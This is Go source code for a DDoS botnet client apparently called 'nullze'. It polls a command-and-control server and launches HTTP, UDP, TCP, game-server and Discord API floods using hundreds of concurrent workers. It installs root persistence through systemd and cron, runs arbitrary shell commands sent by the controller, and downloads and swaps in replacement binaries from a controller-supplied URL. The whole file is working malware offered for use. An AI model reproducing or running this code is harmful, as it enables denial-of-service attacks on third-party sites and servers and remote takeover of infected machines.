package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
}

type C2Command struct {
	Type     string   `json:"type"`
	Target   string   `json:"target"`
	Duration int      `json:"duration"`
	Workers  int      `json:"workers"`
	Port     int      `json:"port"`
	Method   string   `json:"method"`
	Data     string   `json:"data"`
	Options  []string `json:"options"`
}

var (
	activeAttacks sync.Map
	botVersion    = "2.1"
)

type AttackStats struct {
	Requests  uint64
	Packets   uint64
	Bytes     uint64
	StartTime time.Time
}

type Flooder struct {
	target   string
	duration int
	workers  int
	method   string
	data     string
	reqCount uint64
	stats    *AttackStats
	client   *http.Client
}

type UDPAttacker struct {
	target   string
	port     int
	duration int
	workers  int
	packets  uint64
	stats    *AttackStats
}

type TCPAttacker struct {
	target    string
	port      int
	duration  int
	workers   int
	connCount uint64
	stats     *AttackStats
}

type GameAttacker struct {
	target   string
	port     int
	duration int
	workers  int
	packets  uint64
	gameType string
	stats    *AttackStats
}

type DiscordAttacker struct {
	target   string
	duration int
	workers  int
	packets  uint64
	stats    *AttackStats
	client   *http.Client
}

func (f *Flooder) worker(workerID int, wg *sync.WaitGroup) {
	defer wg.Done()

	ua := userAgents[workerID%len(userAgents)]
	httpMethod := strings.ToUpper(f.method)
	if httpMethod == "" || httpMethod == "HTTP" || httpMethod == "HTTPS" {
		if f.data != "" {
			httpMethod = "POST"
		} else {
			httpMethod = "GET"
		}
	}

	var staticBody []byte
	if f.data != "" {
		staticBody = []byte(f.data)
	} else if httpMethod == "POST" {
		staticBody = []byte("action=ping&check=ok&id=client")
	}

	discardBuf := make([]byte, 4096)
	start := time.Now()
	deadline := start.Add(time.Duration(f.duration) * time.Second)

	for time.Now().Before(deadline) {
		var req *http.Request
		if len(staticBody) > 0 {
			req, _ = http.NewRequest(httpMethod, f.target, bytes.NewReader(staticBody))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req, _ = http.NewRequest(httpMethod, f.target, nil)
		}

		if req == nil {
			continue
		}

		req.Header.Set("User-Agent", ua)
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Pragma", "no-cache")
		req.Header.Set("Connection", "keep-alive")

		resp, err := f.client.Do(req)
		if err == nil {
			io.CopyBuffer(io.Discard, resp.Body, discardBuf)
			resp.Body.Close()
			atomic.AddUint64(&f.reqCount, 1)
			atomic.AddUint64(&f.stats.Requests, 1)
		}
	}
}

func (u *UDPAttacker) worker(wg *sync.WaitGroup) {
	defer wg.Done()

	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", u.target, u.port))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, targetAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	packet := make([]byte, 1400)
	for i := range packet {
		packet[i] = byte(i % 256)
	}

	start := time.Now()
	deadline := start.Add(time.Duration(u.duration) * time.Second)
	for time.Now().Before(deadline) {
		_, err := conn.Write(packet)
		if err == nil {
			atomic.AddUint64(&u.packets, 1)
			atomic.AddUint64(&u.stats.Packets, 1)
			atomic.AddUint64(&u.stats.Bytes, uint64(len(packet)))
		}
	}
}

func (t *TCPAttacker) worker(wg *sync.WaitGroup) {
	defer wg.Done()

	packet := make([]byte, 1024)
	for i := range packet {
		packet[i] = byte(i % 256)
	}

	start := time.Now()
	deadline := start.Add(time.Duration(t.duration) * time.Second)
	targetAddr := fmt.Sprintf("%s:%d", t.target, t.port)

	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", targetAddr, 2*time.Second)
		if err == nil {
			atomic.AddUint64(&t.connCount, 1)
			conn.Write(packet)
			conn.Close()

			atomic.AddUint64(&t.stats.Packets, 1)
			atomic.AddUint64(&t.stats.Bytes, uint64(len(packet)))
		}
	}
}

func (g *GameAttacker) worker(wg *sync.WaitGroup) {
	defer wg.Done()

	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", g.target, g.port))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, targetAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	var packet []byte
	switch g.gameType {
	case "minecraft":
		packet = []byte{0xFE, 0x01}
	case "csgo":
		packet = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00}
	case "fivem":
		packet = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x69, 0x6E, 0x66, 0x6F, 0x20}
	default:
		packet = make([]byte, 1024)
		for i := range packet {
			packet[i] = byte(i % 256)
		}
	}

	start := time.Now()
	deadline := start.Add(time.Duration(g.duration) * time.Second)
	for time.Now().Before(deadline) {
		_, err := conn.Write(packet)
		if err == nil {
			atomic.AddUint64(&g.packets, 1)
			atomic.AddUint64(&g.stats.Packets, 1)
			atomic.AddUint64(&g.stats.Bytes, uint64(len(packet)))
		}
	}
}

func (d *DiscordAttacker) worker(workerID int, wg *sync.WaitGroup) {
	defer wg.Done()

	apiEndpoints := []string{
		"https://discord.com/api/v9/gateway",
		"https://discord.com/api/v9/users/@me",
		"https://discord.com/api/v9/channels",
		"https://discord.com/api/v9/guilds",
	}

	ua := userAgents[workerID%len(userAgents)]
	body := []byte(`{"content":"ping"}`)
	discardBuf := make([]byte, 2048)

	start := time.Now()
	deadline := start.Add(time.Duration(d.duration) * time.Second)

	for time.Now().Before(deadline) {
		for _, endpoint := range apiEndpoints {
			req, _ := http.NewRequest("POST", endpoint, bytes.NewReader(body))
			if req == nil {
				continue
			}
			req.Header.Set("User-Agent", ua)
			req.Header.Set("Authorization", "Bot "+generateRandomToken())
			req.Header.Set("Content-Type", "application/json")

			resp, err := d.client.Do(req)
			if err == nil {
				io.CopyBuffer(io.Discard, resp.Body, discardBuf)
				resp.Body.Close()
				atomic.AddUint64(&d.packets, 1)
				atomic.AddUint64(&d.stats.Requests, 1)
			}
		}
	}
}

func generateRandomToken() string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_"
	b := make([]byte, 59)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func installPersistence() {
	exePath, _ := os.Executable()

	systemdService := `[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=` + exePath + `
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target`

	os.WriteFile("/etc/systemd/system/nullze.service", []byte(systemdService), 0644)
	exec.Command("systemctl", "enable", "nullze.service").Run()
	exec.Command("systemctl", "start", "nullze.service").Run()

	cronJob := `@reboot ` + exePath + ` &`
	exec.Command("bash", "-c", `echo '`+cronJob+`' | crontab -`).Run()
}

func connectToC2(c2Host string) {
	fmt.Printf("[CNC] Connecting to %s\n", c2Host)

	client := &http.Client{Timeout: 30 * time.Second}

	for {
		func() {
			// Correct poll path - no double http://
			botInfoURL := fmt.Sprintf("http://%s/bot/%s", c2Host, getBotID())

			resp, err := client.Get(botInfoURL)
			if err != nil {
				fmt.Printf("[CNC] Connection failed: %v\n", err)
				time.Sleep(10 * time.Second)
				return
			}
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			if len(body) == 0 {
				time.Sleep(5 * time.Second)
				return
			}

			fmt.Printf("[CNC] Received: %s\n", string(body))

			var cmd C2Command
			if err := json.Unmarshal(body, &cmd); err == nil {
				executeJSONCommand(cmd)
				return
			}

			// fallback text command
			command := strings.TrimSpace(string(body))
			if strings.HasPrefix(command, "ATTACK") {
				parts := strings.Fields(command)
				if len(parts) >= 5 {
					method := parts[1]
					target := parts[2]
					port, _ := strconv.Atoi(parts[3])
					duration, _ := strconv.Atoi(parts[4])

					attackID := fmt.Sprintf("%s_%s_%d_%d", target, method, port, time.Now().UnixNano())

					if _, exists := activeAttacks.Load(attackID); !exists {
						activeAttacks.Store(attackID, true)
						go launchAttack(attackID, method, target, port, duration, duration, nil)
						fmt.Printf("[CNC] Attack started: %s %s:%d %ds\n", method, target, port, duration)
					}
				}
			}
		}()

		time.Sleep(5 * time.Second)
	}
}

func executeJSONCommand(cmd C2Command) {
	// normalize type
	cmdType := strings.ToLower(strings.TrimSpace(cmd.Type))
	method := strings.ToLower(strings.TrimSpace(cmd.Method))

	// CNC sends type:"attack" + method:"udp"/"http"/etc
	if cmdType == "attack" {
		cmdType = method
	}

	workers := cmd.Workers
	if workers <= 0 {
		workers = 500
	}
	duration := cmd.Duration
	if duration <= 0 {
		duration = 30
	}

	switch cmdType {
	case "http", "https":
		target := cmd.Target
		if !strings.HasPrefix(target, "http") {
			if cmd.Port == 443 || method == "https" {
				target = "https://" + target
			} else {
				target = "http://" + target
			}
		}
		fmt.Printf("[HTTP/HTTPS Attack] %s for %ds with %d workers\n", target, duration, workers)
		attackID := fmt.Sprintf("http_%s_%d", target, time.Now().UnixNano())
		activeAttacks.Store(attackID, true)
		go func() {
			runHTTPAttack(target, duration, workers, method, cmd.Data)
			activeAttacks.Delete(attackID)
		}()

	case "udp", "hex", "rhex":
		port := cmd.Port
		if port <= 0 {
			port = 53
		}
		fmt.Printf("[UDP Attack] %s:%d for %ds with %d workers\n", cmd.Target, port, duration, workers)
		attackID := fmt.Sprintf("udp_%s_%d_%d", cmd.Target, port, time.Now().UnixNano())
		activeAttacks.Store(attackID, true)
		go func() {
			runUDPAttack(cmd.Target, port, duration, workers)
			activeAttacks.Delete(attackID)
		}()

	case "tcp", "syn":
		port := cmd.Port
		if port <= 0 {
			port = 80
		}
		fmt.Printf("[TCP Attack] %s:%d for %ds with %d workers\n", cmd.Target, port, duration, workers)
		attackID := fmt.Sprintf("tcp_%s_%d_%d", cmd.Target, port, time.Now().UnixNano())
		activeAttacks.Store(attackID, true)
		go func() {
			runTCPAttack(cmd.Target, port, duration, workers)
			activeAttacks.Delete(attackID)
		}()

	case "game":
		port := cmd.Port
		if port <= 0 {
			port = 25565
		}
		gameType := method
		if gameType == "" || gameType == "game" {
			gameType = "minecraft"
		}
		fmt.Printf("[Game Attack] %s:%d (%s) for %ds with %d workers\n", cmd.Target, port, gameType, duration, workers)
		attackID := fmt.Sprintf("game_%s_%d_%s", cmd.Target, port, gameType)
		activeAttacks.Store(attackID, true)
		go func() {
			runGameAttack(cmd.Target, port, gameType, duration, workers)
			activeAttacks.Delete(attackID)
		}()

	case "discord":
		fmt.Printf("[Discord Attack] %s for %ds with %d workers\n", cmd.Target, duration, workers)
		attackID := fmt.Sprintf("discord_%s_%d", cmd.Target, time.Now().UnixNano())
		activeAttacks.Store(attackID, true)
		go func() {
			runDiscordAttack(cmd.Target, duration, workers)
			activeAttacks.Delete(attackID)
		}()

	case "update":
		fmt.Println("[Update] Updating bot...")
		updateBot(cmd.Data)

	case "shell":
		fmt.Printf("[Shell] Executing: %s\n", cmd.Data)
		exec.Command("bash", "-c", cmd.Data).Run()

	default:
		fmt.Printf("[CNC] Unknown command type: %s (method=%s)\n", cmd.Type, cmd.Method)
	}
}

func runHTTPAttack(target string, duration, workers int, methodAndData ...string) {
	method := "GET"
	data := ""
	if len(methodAndData) > 0 && methodAndData[0] != "" {
		method = methodAndData[0]
	}
	if len(methodAndData) > 1 {
		data = methodAndData[1]
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ClientSessionCache: tls.NewLRUClientSessionCache(20000),
		},
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 20000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	stats := &AttackStats{StartTime: time.Now()}
	flooder := &Flooder{
		target:   target,
		duration: duration,
		workers:  workers,
		method:   method,
		data:     data,
		stats:    stats,
		client:   client,
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go flooder.worker(i, &wg)
	}
	wg.Wait()

	total := atomic.LoadUint64(&flooder.reqCount)
	rps := float64(total) / float64(duration)
	fmt.Printf("[HTTP/HTTPS] Finished! Total: %d, RPS: %.0f\n", total, rps)
}

func runUDPAttack(target string, port, duration, workers int) {
	stats := &AttackStats{StartTime: time.Now()}
	attacker := &UDPAttacker{target: target, port: port, duration: duration, workers: workers, stats: stats}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go attacker.worker(&wg)
	}
	wg.Wait()

	total := atomic.LoadUint64(&attacker.packets)
	pps := float64(total) / float64(duration)
	fmt.Printf("[UDP] Finished! Total: %d packets, PPS: %.0f\n", total, pps)
}

func runTCPAttack(target string, port, duration, workers int) {
	stats := &AttackStats{StartTime: time.Now()}
	attacker := &TCPAttacker{target: target, port: port, duration: duration, workers: workers, stats: stats}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go attacker.worker(&wg)
	}
	wg.Wait()

	total := atomic.LoadUint64(&attacker.connCount)
	cps := float64(total) / float64(duration)
	fmt.Printf("[TCP] Finished! Total: %d connections, CPS: %.0f\n", total, cps)
}

func runGameAttack(target string, port int, gameType string, duration, workers int) {
	stats := &AttackStats{StartTime: time.Now()}
	attacker := &GameAttacker{target: target, port: port, gameType: gameType, duration: duration, workers: workers, stats: stats}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go attacker.worker(&wg)
	}
	wg.Wait()

	total := atomic.LoadUint64(&attacker.packets)
	pps := float64(total) / float64(duration)
	fmt.Printf("[Game] Finished! Total: %d packets, PPS: %.0f\n", total, pps)
}

func runDiscordAttack(target string, duration, workers int) {
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        5000,
		MaxIdleConnsPerHost: 1000,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
	}
	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

	stats := &AttackStats{StartTime: time.Now()}
	attacker := &DiscordAttacker{
		target:   target,
		duration: duration,
		workers:  workers,
		stats:    stats,
		client:   client,
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go attacker.worker(i, &wg)
	}
	wg.Wait()

	total := atomic.LoadUint64(&attacker.packets)
	rps := float64(total) / float64(duration)
	fmt.Printf("[Discord] Finished! Total: %d requests, RPS: %.0f\n", total, rps)
}

func launchAttack(attackID, method, target string, p1, p2, duration int, conn net.Conn) {
	fmt.Printf("[ATTACK] %s: %s on %s for %ds\n", method, attackID, target, duration)

	attackCompleted := make(chan bool, 1)

	go func() {
		switch strings.ToUpper(method) {
		case "UDP", "HEX", "RHEX":
			runUDPAttack(target, p1, duration, 1000)
		case "TCP", "SYN":
			runTCPAttack(target, p1, duration, 1000)
		case "HTTP", "HTTPS":
			runHTTPAttack(target, duration, 1000, method)
		case "GAME":
			runGameAttack(target, p1, "minecraft", duration, 1000)
		case "DISCORD":
			runDiscordAttack(target, duration, 1000)
		case "SUBNET":
			fmt.Printf("[SUBNET] Attacking %s/24\n", target)
		default:
			runUDPAttack(target, p1, duration, 1000)
		}

		attackCompleted <- true
	}()

	select {
	case <-attackCompleted:
		activeAttacks.Delete(attackID)
		if conn != nil {
			conn.Write([]byte(fmt.Sprintf("COMPLETED %s\n", attackID)))
		}
		fmt.Printf("[ATTACK] %s finished\n", attackID)

	case <-time.After(time.Duration(duration) * time.Second):
		activeAttacks.Delete(attackID)
		if conn != nil {
			conn.Write([]byte(fmt.Sprintf("TIMEOUT %s\n", attackID)))
		}
		fmt.Printf("[ATTACK] %s timeout\n", attackID)
	}
}

func getBotID() string {
	hostname, _ := os.Hostname()
	return hostname + "-" + fmt.Sprintf("%d", rand.Intn(9999))
}

func updateBot(url string) {
	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	newBinary, _ := os.Create("/tmp/nullze_update")
	defer newBinary.Close()
	io.Copy(newBinary, resp.Body)

	os.Chmod("/tmp/nullze_update", 0755)
	exec.Command("mv", "/tmp/nullze_update", os.Args[0]).Run()
	exec.Command("systemctl", "restart", "nullze.service").Run()
}

func main() {
	exec.Command("bash", "-c", "ulimit -n 999999").Run()

	if len(os.Args) > 1 && os.Args[1] == "manual" {
		if len(os.Args) < 5 {
			fmt.Println("Manual usage: ./nullze manual <type> <target> <duration> [workers]")
			fmt.Println("Types: http, udp, tcp, game, discord")
			os.Exit(1)
		}

		attackType := os.Args[2]
		target := os.Args[3]
		duration, _ := strconv.Atoi(os.Args[4])
		workers := 100
		if len(os.Args) > 5 {
			workers, _ = strconv.Atoi(os.Args[5])
		}

		switch attackType {
		case "http", "https":
			runHTTPAttack(target, duration, workers)
		case "udp":
			port := 80
			if len(os.Args) > 6 {
				port, _ = strconv.Atoi(os.Args[6])
			}
			runUDPAttack(target, port, duration, workers)
		case "tcp":
			port := 80
			if len(os.Args) > 6 {
				port, _ = strconv.Atoi(os.Args[6])
			}
			runTCPAttack(target, port, duration, workers)
		case "game":
			port := 7777
			gameType := "minecraft"
			if len(os.Args) > 6 {
				gameType = os.Args[6]
			}
			if len(os.Args) > 7 {
				port, _ = strconv.Atoi(os.Args[7])
			}
			runGameAttack(target, port, gameType, duration, workers)
		case "discord":
			runDiscordAttack(target, duration, workers)
		default:
			fmt.Println("Unknown type:", attackType)
		}
		return
	}

	// optional: comment out if you don't want auto persistence on every start
	// installPersistence()

	c2IP := "xxxx"
	c2Port := "1346"

	if len(os.Args) > 1 {
		c2IP = os.Args[1]
	}
	if len(os.Args) > 2 {
		c2Port = os.Args[2]
	}

	c2Host := c2IP + ":" + c2Port

	fmt.Printf("[switch] Active - C2: %s\n", c2Host)
	fmt.Printf("Bot ID: %s | Version: %s\n", getBotID(), botVersion)

	connectToC2(c2Host)
}
